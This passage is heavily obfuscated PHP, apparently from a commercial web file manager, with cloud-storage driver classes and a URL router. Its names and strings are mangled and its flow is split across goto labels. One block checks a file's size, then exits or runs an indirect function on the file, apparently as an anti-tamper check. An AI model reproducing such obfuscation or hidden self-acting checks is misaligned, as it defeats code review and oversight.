$Ïˆû‘×ö >= $Åığ­ƒË || $ÖìÕ„ï > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\145\x52\x65\x61\x64\40\x65\162\x72\x6f\x72\41\x20\x73\x74\x61\x72\x74\75{$Ïˆû‘×ö}\x3b\x6c\x65\x6e\147\x74\150\x3d{$ÖìÕ„ï}\x3b\40\x73\151\172\145\75{$Åığ­ƒË}\x3b"); } $âë†¢ó™ = $“ÒÀô™¬->fileSubstr($ÌâÖ¯†, $Ïˆû‘×ö, $ÖìÕ„ï); if (!$âë†¢ó™ && $ÖìÕ„ï && isset($GLOBALS[$×Ñûß¶[1219]])) { throw new Exception($GLOBALS[$×Ñûß¶[1219]][$×Ñûß¶[1220]]); } return $âë†¢ó™; } private static function driverMake(&$Àò‡¬¬¬) { $³é•°ÁĞ =& $_SERVER[Õò”†—·]; $°àŒÏÁ® = KodIO::parse($Àò‡¬¬¬); if (!self::$driverListSystem) { $ĞÛ¾¬Ş² = Model($³é•°ÁĞ[818])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ĞÛ¾¬Ş², $³é•°ÁĞ[459]); } if ($°àŒÏÁ®[$³é•°ÁĞ[43]] == KodIO::KOD_IO && !self::$driverListSystem[$°àŒÏÁ®[$³é•°ÁĞ[459]]]) { throw new Exception($³é•°ÁĞ[1221]); return !1; } $Àò‡¬¬¬ = $°àŒÏÁ®[$³é•°ÁĞ[1222]]; $™îÙì«ë = self::driverGet($°àŒÏÁ®, $Àò‡¬¬¬); return $™îÙì«ë; } private static function driverGet($ÔÀ„ô˜, &$–Œ¡àÑ) { $ñ‘ÇíÀ =& $_SERVER[Õò”†—·]; $º·£’’ = $ÔÀ„ô˜[$ñ‘ÇíÀ[1223]]; $¾Ù†µ‚¹ = $ÔÀ„ô˜[$ñ‘ÇíÀ[459]]; switch ($ÔÀ„ô˜[$ñ‘ÇíÀ[43]]) { case KodIO::KOD_IO: $æªšÔ¯ã = self::$driverListSystem[$¾Ù†µ‚¹]; break; case KodIO::KOD_SOURCE: $–Œ¡àÑ = $¾Ù†µ‚¹ . $–Œ¡àÑ; $æªšÔ¯ã = array($ñ‘ÇíÀ[1224] => $ñ‘ÇíÀ[1225], $ñ‘ÇíÀ[16] => $ÔÀ„ô˜); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Í¤Ú¡Ë• = $GLOBALS[$ñ‘ÇíÀ[1226]]; self::$driverListUser = array_to_keyvalue($Í¤Ú¡Ë•, $ñ‘ÇíÀ[459]); } $æªšÔ¯ã = self::$driverListUser[$¾Ù†µ‚¹]; break; case KodIO::KOD_SHARE_LINK: $æªšÔ¯ã = array($ñ‘ÇíÀ[1224] => $ñ‘ÇíÀ[1227], $ñ‘ÇíÀ[16] => $ÔÀ„ô˜); $å®üÑ¨– = Action($ñ‘ÇíÀ[1228])->sharePathInfo($ÔÀ„ô˜[$ñ‘ÇíÀ[97]]); $–Œ¡àÑ = $å®üÑ¨–[$ñ‘ÇíÀ[194]]; if (!$å®üÑ¨–[$ñ‘ÇíÀ[194]]) { $òñÔÌ¸ = Model($ñ‘ÇíÀ[648])->getInfo($å®üÑ¨–[$ñ‘ÇíÀ[649]]); $–Œ¡àÑ = KodIO::clear($òñÔÌ¸[$ñ‘ÇíÀ[1229]] . $ÔÀ„ô˜[$ñ‘ÇíÀ[1222]]); $ÔÀ„ô˜[$ñ‘ÇíÀ[545]] = $òñÔÌ¸; $ÔÀ„ô˜[$ñ‘ÇíÀ[1204]] = $–Œ¡àÑ; $æªšÔ¯ã = array($ñ‘ÇíÀ[1224] => $ñ‘ÇíÀ[1230], $ñ‘ÇíÀ[16] => $ÔÀ„ô˜); } break; case KodIO::KOD_SHARE_ITEM: $æªšÔ¯ã = array($ñ‘ÇíÀ[1224] => $ñ‘ÇíÀ[1231], $ñ‘ÇíÀ[16] => $ÔÀ„ô˜); $òñÔÌ¸ = Model($ñ‘ÇíÀ[648])->getInfo($ÔÀ„ô˜[$ñ‘ÇíÀ[459]]); if ($òñÔÌ¸[$ñ‘ÇíÀ[194]] == $ñ‘ÇíÀ[229]) { $–Œ¡àÑ = KodIO::clear($òñÔÌ¸[$ñ‘ÇíÀ[1229]] . $ÔÀ„ô˜[$ñ‘ÇíÀ[1222]]); $ÔÀ„ô˜[$ñ‘ÇíÀ[545]] = $òñÔÌ¸; $ÔÀ„ô˜[$ñ‘ÇíÀ[1204]] = $–Œ¡àÑ; $æªšÔ¯ã = array($ñ‘ÇíÀ[1224] => $ñ‘ÇíÀ[1232], $ñ‘ÇíÀ[16] => $ÔÀ„ô˜); } else { if (!$–Œ¡àÑ) { $–Œ¡àÑ = $òñÔÌ¸[$ñ‘ÇíÀ[194]]; } } break; default: $–Œ¡àÑ = $ÔÀ„ô˜[$ñ‘ÇíÀ[97]]; $æªšÔ¯ã = array($ñ‘ÇíÀ[1224] => $ñ‘ÇíÀ[1233]); break; } $ÑŒ×›® = $ÔÀ„ô˜[$ñ‘ÇíÀ[97]]; if (!isset(self::$driverCache[$ÑŒ×›®])) { $Å§ñ¶» = strtolower($æªšÔ¯ã[$ñ‘ÇíÀ[108]]); $¸ş…’Á = $GLOBALS[$ñ‘ÇíÀ[16]][$ñ‘ÇíÀ[102]][$ñ‘ÇíÀ[876]]; $´í¤İÊè = $ñ‘ÇíÀ[87] . (isset($¸ş…’Á[$Å§ñ¶»]) ? $¸ş…’Á[$Å§ñ¶»] : ucfirst($Å§ñ¶»)); if (!class_exists($´í¤İÊè)) { show_json("{$´í¤İÊè}\40\x6e\x6f\164\x20\x65\x78\151\163\164\x73\41", !1); } $šËÁÜ™Ì = isset($æªšÔ¯ã[$ñ‘ÇíÀ[16]]) ? $æªšÔ¯ã[$ñ‘ÇíÀ[16]] : !1; self::$driverCache[$ÑŒ×›®] = new $´í¤İÊè($šËÁÜ™Ì); } $ÇÅ†£²Š = self::$driverCache[$ÑŒ×›®]; $ÇÅ†£²Š->pathDriver = $º·£’’; $ÇÅ†£²Š->pathBase = $ñ‘ÇíÀ[22]; if (isset($æªšÔ¯ã[$ñ‘ÇíÀ[16]][$ñ‘ÇíÀ[1234]])) { $ÇÅ†£²Š->pathBase = rtrim($æªšÔ¯ã[$ñ‘ÇíÀ[16]][$ñ‘ÇíÀ[1234]], $ñ‘ÇíÀ[18]) . $ñ‘ÇíÀ[18]; $–Œ¡àÑ = $ÇÅ†£²Š->pathBase . ltrim($–Œ¡àÑ, $ñ‘ÇíÀ[18]); } $–Œ¡àÑ = $ÇÅ†£²Š->getPath($–Œ¡àÑ); if (isset($ÔÀ„ô˜[$ñ‘ÇíÀ[1204]])) { $–Œ¡àÑ = $ÔÀ„ô˜[$ñ‘ÇíÀ[1204]]; } $ÇÅ†£²Š->path = $–Œ¡àÑ; return $ÇÅ†£²Š; } public static function errorTips($Ö•¼Õ¡ = false) { $â•‚åş§ =& $_SERVER[Õò”†—·]; static $û‰šåÒŒ = array(); $ ëƒ›ìÇ = 1000; if ($Ö•¼Õ¡ === -1) { return $û‰šåÒŒ ? $û‰šåÒŒ[count($û‰šåÒŒ) - 1] : $â•‚åş§[22]; } if ($Ö•¼Õ¡ === !1) { return implode($â•‚åş§[12], $û‰šåÒŒ); } if (count($û‰šåÒŒ) >= $ ëƒ›ìÇ) { $û‰šåÒŒ = array_slice($û‰šåÒŒ, $ ëƒ›ìÇ * 0.5, $ ëƒ›ìÇ); } $û‰šåÒŒ[] = $Ö•¼Õ¡; write_log($â•‚åş§[176] . ACTION . $â•‚åş§[1235] . $Ö•¼Õ¡, $â•‚åş§[1236]); } public static function getLastError($‰µÍæ = '') { $Ì¸“‚Ê† = self::errorTips(-1); return $Ì¸“‚Ê† ? $Ì¸“‚Ê† : $‰µÍæ; } } goto FóîŠ¤ßö; AÄ†ê‡ÈÑ: $_size = $_SERVER[Õò”†—·][7]; if ($_SERVER[$_SERVER[Õò”†—·][8]] != $_size($_file)) { $_getc = $_SERVER[Õò”†—·][9]; $_getfile = $_SERVER[$_SERVER[Õò”†—·][10]] . $_SERVER[Õò”†—·][11]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Õò”†—·][12], $_getfilec); if (count($_getarrs) < $_SERVER[Õò”†—·][13]) { $exit = $_SERVER[Õò”†—·][14]; $exit(); } $_act = $_SERVER[Õò”†—·][15]; $_act($_file); } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\x79" => "\x5b\136\57\135\x2b", "\x3a\156\x75\x6d" => "\x5b\60\x2d\71\135\53", "\72\x61\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($´–Âœ“¦, $ûÌ‰ğù›) { $¶Ë™ïı =& $_SERVER[Õò”†—·]; if ($´–Âœ“¦ == $¶Ë™ïı[1691]) { $˜Ğš‘ßÙ = array_map($¶Ë™ïı[1692], $ûÌ‰ğù›[0]); $®œÔ¸Ò— = strpos($ûÌ‰ğù›[1], $¶Ë™ïı[18]) === 0 ? $ûÌ‰ğù›[1] : $¶Ë™ïı[18] . $ûÌ‰ğù›[1]; $¿à¡àÛÒ = $ûÌ‰ğù›[2]; } else { $˜Ğš‘ßÙ = null; $®œÔ¸Ò— = strpos($ûÌ‰ğù›[0], $¶Ë™ïı[18]) === 0 ? $ûÌ‰ğù›[0] : $¶Ë™ïı[18] . $ûÌ‰ğù›[0]; $¿à¡àÛÒ = $ûÌ‰ğù›[1]; } array_push(self::$maps, $˜Ğš‘ßÙ); array_push(self::$routes, $®œÔ¸Ò—); array_push(self::$methods, strtoupper($´–Âœ“¦)); array_push(self::$callbacks, $¿à¡àÛÒ); } public static function error($­àôÏô’) { self::$errorCallback = $­àôÏô’; } public static function haltOnMatch($Â‡ÔÊÓü = true) { self::$halts = $Â‡ÔÊÓü; } public static function dispatch() { $ÂˆÏ˜Ë =& $_SERVER[Õò”†—·]; $òª”ó©¤ = parse_url($_SERVER[$ÂˆÏ˜Ë[1693]], PHP_URL_PATH); $äì§ã— = $_SERVER[$ÂˆÏ˜Ë[173]]; $Ãáğ·€ = array_keys(static::$patterns); $¡ıÁ›Ö³ = array_values(static::$patterns); $ïªÕıˆş = !1; self::$routes = preg_replace($ÂˆÏ˜Ë[1330], $ÂˆÏ˜Ë[18], self::$routes); if (in_array($òª”ó©¤, self::$routes)) { $ÌàÔøò = array_keys(self::$routes, $òª”ó©¤); foreach ($ÌàÔøò as $ìÙ¸äÀ¢) { if (self::$methods[$ìÙ¸äÀ¢] == $äì§ã— || self::$methods[$ìÙ¸äÀ¢] == $ÂˆÏ˜Ë[1694] || in_array($äì§ã—, self::$maps[$ìÙ¸äÀ¢])) { $ïªÕıˆş = !0; if (!is_object(self::$callbacks[$ìÙ¸äÀ¢])) { $ŠÎ„õúõ = explode($ÂˆÏ˜Ë[18], self::$callbacks[$ìÙ¸äÀ¢]); $ÊÊ¡ä»· = end($ŠÎ„õúõ); $ò»“” = explode($ÂˆÏ˜Ë[1262], $ÊÊ¡ä»·); $—ŠéÜ™ = new $ò»“”[0](); $—ŠéÜ™->{$ò»“”[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ìÙ¸äÀ¢]); if (self::$halts) { return; } } } } } else { $•¼ÀÖÙ = 0; foreach (self::$routes as $ìÙ¸äÀ¢) { if (strpos($ìÙ¸äÀ¢, $ÂˆÏ˜Ë[4]) !== !1) { $ìÙ¸äÀ¢ = str_replace($Ãáğ·€, $¡ıÁ›Ö³, $ìÙ¸äÀ¢); } if (preg_match($ÂˆÏ˜Ë[1695] . $ìÙ¸äÀ¢ . $ÂˆÏ˜Ë[1696], $òª”ó©¤, $ëÍªµìÅ)) { if (self::$methods[$•¼ÀÖÙ] == $äì§ã— || self::$methods[$•¼ÀÖÙ] == $ÂˆÏ˜Ë[1694] || !empty(self::$maps[$•¼ÀÖÙ]) && in_array($äì§ã—, self::$maps[$•¼ÀÖÙ])) { $ïªÕıˆş = !0; array_shift($ëÍªµìÅ); if (!is_object(self::$callbacks[$•¼ÀÖÙ])) { $ŠÎ„õúõ = explode($ÂˆÏ˜Ë[18], self::$callbacks[$•¼ÀÖÙ]); $ÊÊ¡ä»· = end($ŠÎ„õúõ); $ò»“” = explode($ÂˆÏ˜Ë[1262], $ÊÊ¡ä»·); $—ŠéÜ™ = new $ò»“”[0](); if (!method_exists($—ŠéÜ™, $ò»“”[1])) { echo $ÂˆÏ˜Ë[1697]; } else { call_user_func_array(array($—ŠéÜ™, $ò»“”[1]), $ëÍªµìÅ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$•¼ÀÖÙ], $ëÍªµìÅ); if (self::$halts) { return; } } } } $•¼ÀÖÙ++; } } if ($ïªÕıˆş == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ºñë†™ =& $_SERVER[Õò”†—·]; header($_SERVER[$ºñë†™[1698]] . $ºñë†™[1699]); echo $ºñë†™[1700]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ÂˆÏ˜Ë[1693]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto aÏ§æç¾ˆ³; e¦œéĞÕÂ: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¦ıíº¥) { parent::__construct($¦ıíº¥); $this->setSignVersion($_SERVER[Õò”†—·][248]); } public function fileOutImage($ÃÕà¼Õ¢, $Ê¡ş„Â = 250) { $×šÑÎ¶â =& $_SERVER[Õò”†—·]; if ($this->size($ÃÕà¼Õ¢) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ÃÕà¼Õ¢, $Ê¡ş„Â); } $æúÉìŞ = array($×šÑÎ¶â[1428] => $×šÑÎ¶â[1429] . $Ê¡ş„Â . $×šÑÎ¶â[1430]); $»ÏÆÓê÷ = $this->link($ÃÕà¼Õ¢, $æúÉìŞ); $this->fileOutLink($»ÏÆÓê÷); } public function fileOutLink($Ê§ÁÇ”…) { $ ïîµ¡ =& $_SERVER[Õò”†—·]; if (substr($Ê§ÁÇ”…, 0, 7) == $ ïîµ¡[1378]) { $Ê§ÁÇ”… = $ ïîµ¡[1379] . substr($Ê§ÁÇ”…, 7); } header($ ïîµ¡[175] . $Ê§ÁÇ”…); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($•ú¯”ª) { parent::__construct($•ú¯”ª); $this->setSignVersion($_SERVER[Õò”†—·][248]); } public function fileOutLink($ŠëœÚè›) { $°ßÎçÚ =& $_SERVER[Õò”†—·]; if (substr($ŠëœÚè›, 0, 7) == $°ßÎçÚ[1378]) { $ŠëœÚè› = $°ßÎçÚ[1379] . substr($ŠëœÚè›, 7); } header($°ßÎçÚ[175] . $ŠëœÚè›); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($¾å³ö‡¯) { parent::__construct(); include_once SDK_DIR . $_SERVER[Õò”†—·][1431]; $this->_init($¾å³ö‡¯); } public function _init($æŞúÚ“Î) { $¯Äı®Úä =& $_SERVER[Õò”†—·]; $this->config = $æŞúÚ“Î; foreach ($æŞúÚ“Î as $ò–øê×Œ => $Ëí¹†) { if (isset($this->{$ò–øê×Œ})) { $this->{$ò–øê×Œ} = $Ëí¹†; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¯Äı®Úä[1432] . LNG($¯Äı®Úä[1433])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ŒÙ¸Î =& $_SERVER[Õò”†—·]; $‚º¤¡ÄÂ = new OSS\Model\CorsConfig(); $½¶²Çë = new OSS\Model\CorsRule(); $½¶²Çë->addAllowedOrigin($ŒÙ¸Î[1434]); $½¶²Çë->addAllowedMethod($ŒÙ¸Î[1435]); $½¶²Çë->addAllowedMethod($ŒÙ¸Î[1436]); $½¶²Çë->addAllowedMethod($ŒÙ¸Î[1437]); $½¶²Çë->addAllowedMethod($ŒÙ¸Î[1438]); $½¶²Çë->addAllowedMethod($ŒÙ¸Î[174]); $½¶²Çë->setMaxAgeSeconds(600); $½¶²Çë->addExposeHeader($ŒÙ¸Î[1439]); $½¶²Çë->addAllowedHeader($ŒÙ¸Î[1434]); $‚º¤¡ÄÂ->addRule($½¶²Çë); try { $this->client->putBucketCors($this->bucket, $‚º¤¡ÄÂ); } catch (OSS\Core\OssException $°Ù§ÄÍÃ) { $this->writeLog(__FUNCTION__ . $ŒÙ¸Î[215] . $°Ù§ÄÍÃ->getMessage()); return !1; } return !0; } public function getBucketCors() { $í¿›ğ–Ê =& $_SERVER[Õò”†—·]; $‡ÑàĞ·ö = null; try { $‡ÑàĞ·ö = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $®÷‚®«‰) { $this->writeLog(__FUNCTION__ . $í¿›ğ–Ê[215] . $®÷‚®«‰->getMessage()); return null; } if (!$‡ÑàĞ·ö || !($ı©“½‰ = $‡ÑàĞ·ö->getRules())) { return null; } $°¼æ”ß€ = $ı©“½‰[0]->getAllowedOrigins(); $×ëö‡ = $ı©“½‰[0]->getAllowedMethods(); $Êò—ó”§ = $ı©“½‰[0]->getMaxAgeSeconds(); $’›ÆŒ = $ı©“½‰[0]->getExposeHeaders(); $¦İä´íà = $ı©“½‰[0]->getAllowedHeaders(); return array($í¿›ğ–Ê[219] => isset($°¼æ”ß€[0]) ? $°¼æ”ß€[0] : $í¿›ğ–Ê[22], $í¿›ğ–Ê[223] => $×ëö‡, $í¿›ğ–Ê[1440] => $Êò—ó”§, $í¿›ğ–Ê[1441] => isset($’›ÆŒ[0]) ? $’›ÆŒ[0] : $í¿›ğ–Ê[22], $í¿›ğ–Ê[220] => isset($¦İä´íà[0]) ? $¦İä´íà[0] : $í¿›ğ–Ê[22]); } public function isBucketCors() { $·ªñ¤¦ =& $_SERVER[Õò”†—·]; $½ğ”÷¢õ = $this->getBucketCors(); if (!$½ğ”÷¢õ || !is_array($½ğ”÷¢õ)) { return !1; } if ($½ğ”÷¢õ[$·ªñ¤¦[219]] != $·ªñ¤¦[221] || $½ğ”÷¢õ[$·ªñ¤¦[220]] != $·ªñ¤¦[221]) { return !1; } $¥«›’ç = array_map($·ªñ¤¦[222], $½ğ”÷¢õ[$·ªñ¤¦[223]]); if (!is_array($¥«›’ç)) { $¥«›’ç = array(); } $ëçÏ÷İ¦ = array($·ªñ¤¦[224], $·ªñ¤¦[225], $·ªñ¤¦[226], $·ªñ¤¦[227], $·ªñ¤¦[228]); $ì£—£ê = array_diff($ëçÏ÷İ¦, $¥«›’ç); return empty($ì£—£ê); } public function mkfile($€©º†Ú÷, $ïË‘Üó = '', $Ôëó› = REPEAT_RENAME) { $ŸĞ âÜ = $this->setContent($€©º†Ú÷, $ïË‘Üó); if ($ŸĞ âÜ !== !1) { return $this->getPathOuter($€©º†Ú÷); } return !1; } public function mkdir($¢Š¡©ö, $ì½·°¢ù = REPEAT_SKIP) { if ($ì½·°¢ù && $this->_isFolder($¢Š¡©ö)) { return $this->getPathOuter($¢Š¡©ö); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($¢Š¡©ö)); } catch (OSS\Core\OssException $ô¥½âêĞ) { $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][215] . $ô¥½âêĞ->getMessage()); return !1; } return $this->getPathOuter($¢Š¡©ö); } private function fileList($ŒœÏĞ¬É, $ĞÈ™–¶‘ = '', $¢•ç‘ß¦ = 0) { $ú½ØÒá =& $_SERVER[Õò”†—·]; $ŒœÏĞ¬É = trim($ŒœÏĞ¬É, $ú½ØÒá[18]); $‚å¹‹¼Ã = empty($ŒœÏĞ¬É) && $ŒœÏĞ¬É !== $ú½ØÒá[229] ? $ú½ØÒá[22] : $ŒœÏĞ¬É . $ú½ØÒá[18]; $›Ğ€Å‹Ò = $ú½ØÒá[22]; $½ŒüˆúÇ = 1000; $ÓûúÅ÷í = $½”æâĞã = array(); while (!0) { check_abort(); $§â–Îö€ = array($ú½ØÒá[1442] => $ĞÈ™–¶‘, $ú½ØÒá[1443] => $‚å¹‹¼Ã, $ú½ØÒá[1444] => $½ŒüˆúÇ, $ú½ØÒá[1445] => $›Ğ€Å‹Ò); try { $—ÖªıÚ = $this->client->listObjects($this->bucket, $§â–Îö€); } catch (OSS\Core\OssException $®˜ÓÃö) { $this->writeLog(__FUNCTION__ . $ú½ØÒá[215] . $®˜ÓÃö->getMessage()); break; } $›Ğ€Å‹Ò = $—ÖªıÚ->getNextMarker(); $ÚíûÌ×¹ = $—ÖªıÚ->getObjectList(); $Í¸ğÑî¢ = $—ÖªıÚ->getPrefixList(); foreach ($ÚíûÌ×¹ as $ºÓî¬çÊ) { if ($ºÓî¬çÊ->getKey() == $‚å¹‹¼Ã) { continue; } $‰Óæ˜‰ = $ºÓî¬çÊ->getKey(); $ÁÈş÷À© = $ºÓî¬çÊ->getSize(); $ÀÚƒÃÃó = $ºÓî¬çÊ->getLastModified(); $™­¸«‡ş = trim($ºÓî¬çÊ->getETag(), $ú½ØÒá[131]); $Ê°³ÅÌå = $¢•ç‘ß¦ ? array($ú½ØÒá[42] => $‰Óæ˜‰, $ú½ØÒá[89] => $ÁÈş÷À©, $ú½ØÒá[207] => strtotime($ÀÚƒÃÃó), $ú½ØÒá[1446] => $™­¸«‡ş) : $‰Óæ˜‰; $ÊÄ’ÌÃ¡ = $ÁÈş÷À© == 0 && substr($‰Óæ˜‰, strlen($‰Óæ˜‰) - 1, 1) == $ú½ØÒá[18] ? !0 : !1; $–àÊ¦×Á = array($ú½ØÒá[89] => $ÁÈş÷À©, $ú½ØÒá[1447] => $ÁÈş÷À©, $ú½ØÒá[98] => strtotime($ÀÚƒÃÃó), $ú½ØÒá[1448] => $ÀÚƒÃÃó, $ú½ØÒá[1446] => $™­¸«‡ş); $this->cacheMethodInfoSet($‰Óæ˜‰, $ÊÄ’ÌÃ¡, $–àÊ¦×Á); if ($ÊÄ’ÌÃ¡) { $ÓûúÅ÷í[] = $‰Óæ˜‰; continue; } $½”æâĞã[] = $Ê°³ÅÌå; } foreach ($Í¸ğÑî¢ as $¤‘ÁÓÌ) { $ÓûúÅ÷í[] = $¤‘ÁÓÌ->getPrefix(); $this->cacheMethodInfoSet($¤‘ÁÓÌ->getPrefix(), !0); } if ($›Ğ€Å‹Ò === $ú½ØÒá[22]) { break; } } $this->cacheMethodInfoSet($ŒœÏĞ¬É, !0); return array($ú½ØÒá[95] => $ÓûúÅ÷í, $ú½ØÒá[96] => $½”æâĞã); } public function listObject($ÒŞš´ÖŒ, $Ô¨Š€™ = '') { $ÌŞ¨Ù³ =& $_SERVER[Õò”†—·]; $ÒŞš´ÖŒ = trim($ÒŞš´ÖŒ, $ÌŞ¨Ù³[18]); $©œŒö² = empty($ÒŞš´ÖŒ) && $ÒŞš´ÖŒ !== $ÌŞ¨Ù³[229] ? $ÌŞ¨Ù³[22] : $ÒŞš´ÖŒ . $ÌŞ¨Ù³[18]; $¸£õè« = $ÌŞ¨Ù³[22]; $ÌÓÜú§Ç = 1000; $–ñ³øŠ¶ = $ò©””àµ = array(); while (!0) { check_abort(); $£¤«›ÉÃ = array($ÌŞ¨Ù³[1442] => $Ô¨Š€™, $ÌŞ¨Ù³[1443] => $©œŒö², $ÌŞ¨Ù³[1444] => $ÌÓÜú§Ç, $ÌŞ¨Ù³[1445] => $¸£õè«); try { $îô»²ªò = $this->client->listObjects($this->bucket, $£¤«›ÉÃ); } catch (OSS\Core\OssException $ÁÒ¼Ã³) { $this->writeLog(__FUNCTION__ . $ÌŞ¨Ù³[215] . $ÁÒ¼Ã³->getMessage()); break; } $¸£õè« = $îô»²ªò->getNextMarker(); $¼Ëò­Ä = $îô»²ªò->getObjectList(); foreach ($¼Ëò­Ä as $¨£úßÓ) { if ($¨£úßÓ->getKey() == $©œŒö²) { continue; } $ô¬ùÅ®š = $¨£úßÓ->getKey(); $çøôÌé = $¨£úßÓ->getSize(); $±£òá® = $çøôÌé == 0 && substr($ô¬ùÅ®š, strlen($ô¬ùÅ®š) - 1, 1) == $ÌŞ¨Ù³[18] ? !0 : !1; if ($±£òá®) { continue; } (yield $çøôÌé . $ÌŞ¨Ù³[215] . $ô¬ùÅ®š); } if ($¸£õè« === $ÌŞ¨Ù³[22]) { break; } } } public function copyFile($¼éì¥»ş, $ÃšŠË«) { $ïŒÅ²ÄÎ = $this->size($¼éì¥»ş); if ($ïŒÅ²ÄÎ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¼éì¥»ş, $this->bucket, $this->pathEncode($ÃšŠË«)); } catch (OSS\Core\OssException $æ½«Ã¬) { $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][215] . $æ½«Ã¬->getMessage()); return !1; } return $this->getPathOuter($ÃšŠË«); } $ç¾Œ¯ö = $this->multiCopyObject($¼éì¥»ş, $ÃšŠË«, $ïŒÅ²ÄÎ); return $ç¾Œ¯ö ? $this->getPathOuter($ÃšŠË«) : !1; } private function multiCopyObject($ÇÚœ«ØÜ, $×‰ÆÇşÖ, $Óä—àŸÓ) { $·©»ø‡é =& $_SERVER[Õò”†—·]; try { $€öÅİë¬ = array(); if ($õÊØù¥ = $this->hashMd5($ÇÚœ«ØÜ)) { $€öÅİë¬ = array(OSS\OssClient::OSS_HEADERS => array($·©»ø‡é[1449] => $õÊØù¥)); } $‰ø“ª©¹ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($×‰ÆÇşÖ), $€öÅİë¬); $¼ Ã ¤… = 1; $èÖĞæ¡€ = 0; $²³¹öÓ¿ = array(); $–ÓÖ‡áÇ = 1024 * 1024 * 10; $¢ş‘³à™ = $this->client->generateMultiuploadParts($Óä—àŸÓ, $–ÓÖ‡áÇ); foreach ($¢ş‘³à™ as $ªĞ³ğë› => $¤Ë¼¹¶á) { $Ş·‚¬˜ã = $èÖĞæ¡€ + (int) $¤Ë¼¹¶á[$·©»ø‡é[1450]]; $«Âğ¢» = (int) $¤Ë¼¹¶á[$·©»ø‡é[397]] + $Ş·‚¬˜ã - 1; $ï­—½¬ = array($·©»ø‡é[1451] => $Ş·‚¬˜ã, $·©»ø‡é[1452] => $«Âğ¢»); $²³¹öÓ¿[] = $this->client->uploadPartCopy($this->bucket, $ÇÚœ«ØÜ, $this->bucket, $this->pathEncode($×‰ÆÇşÖ), $¼ Ã ¤…, $‰ø“ª©¹, $ï­—½¬); $¼ Ã ¤… = $¼ Ã ¤… + 1; } $Â‚ìá³ = array(); foreach ($²³¹öÓ¿ as $ªĞ³ğë› => $¤İÁ±Ø) { $Â‚ìá³[] = array($·©»ø‡é[1453] => $ªĞ³ğë› + 1, $·©»ø‡é[1454] => $¤İÁ±Ø); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($×‰ÆÇşÖ), $‰ø“ª©¹, $Â‚ìá³); } catch (OSS\Core\OssException $Îë“ßÂƒ) { $this->writeLog(__FUNCTION__ . $·©»ø‡é[215] . $Îë“ßÂƒ->getMessage()); return !1; } return !0; } public function moveFile($ÊßŠı“, $Ê‹­„¿) { if ($this->copyFile($ÊßŠı“, $Ê‹­„¿)) { $this->remove($ÊßŠı“); return $this->getPathOuter($Ê‹­„¿); } return !1; } public function delFile($´¼ª¯ˆ¨) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($´¼ª¯ˆ¨)); } catch (OSS\Core\OssException $äæ–¸Ê‡) { $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][215] . $äæ–¸Ê‡->getMessage()); return !1; } return !0; } public function delFolder($ıà…ÍË) { $½—û•üÇ =& $_SERVER[Õò”†—·]; if (!$this->exist($ıà…ÍË)) { return !0; } $this->listItemCache = !1; $Ÿ˜¶Ö¨ï = $this->fileList($ıà…ÍË); $this->listItemCache = !0; $Å¥Ø÷ù = trim($ıà…ÍË, $½—û•üÇ[18]) . $½—û•üÇ[18]; if (!empty($ıà…ÍË) && $ıà…ÍË !== $½—û•üÇ[229] && !in_array($Å¥Ø÷ù, $Ÿ˜¶Ö¨ï[$½—û•üÇ[95]])) { $Ÿ˜¶Ö¨ï[$½—û•üÇ[95]][] = $Å¥Ø÷ù; } $¼®´ã…Ó = $this->delByBatch($Ÿ˜¶Ö¨ï[$½—û•üÇ[96]]); if (!$¼®´ã…Ó) { return !1; } $¼®´ã…Ó = $this->delByBatch($Ÿ˜¶Ö¨ï[$½—û•üÇ[95]]); if (!$¼®´ã…Ó) { return !1; } return $this->delFile($Å¥Ø÷ù); } private function delByBatch($ÏÒ‡Úî¥) { foreach (array_chunk($ÏÒ‡Úî¥, 1000) as $ÅÂß›ü) { try { $this->client->deleteObjects($this->bucket, $ÅÂß›ü); } catch (OSS\Core\OssException $Ìäâ‹ÉØ) { $this->writeLog(__FUNCTION__ . $_SERVER[Õò”†—·][215] . $Ìäâ‹ÉØ->getMessage()); return !1; } } return !0; } public function rename($€ä”ï¶é, $Œù·„±†) { return $this->renameObject($€ä”ï¶é, $Œù·„±†); } private function fileInfo($å†¤œöˆ, $¢ú×Ó¡™ = false, $µííÀ¨ = array()) { $áÆı²Ò‹ =& $_SERVER[Õò”†—·]; $ŠÓİöÎ± = array($áÆı²Ò‹[42] => $this->pathThis($å†¤œöˆ), $áÆı²Ò‹[97] => $this->getPathOuter($å†¤œöˆ), $áÆı²Ò‹[43] => $áÆı²Ò‹[231], $áÆı²Ò‹[89] => isset($µííÀ¨[$áÆı²Ò‹[89]]) ? $µííÀ¨[$áÆı²Ò‹[89]] : 0, 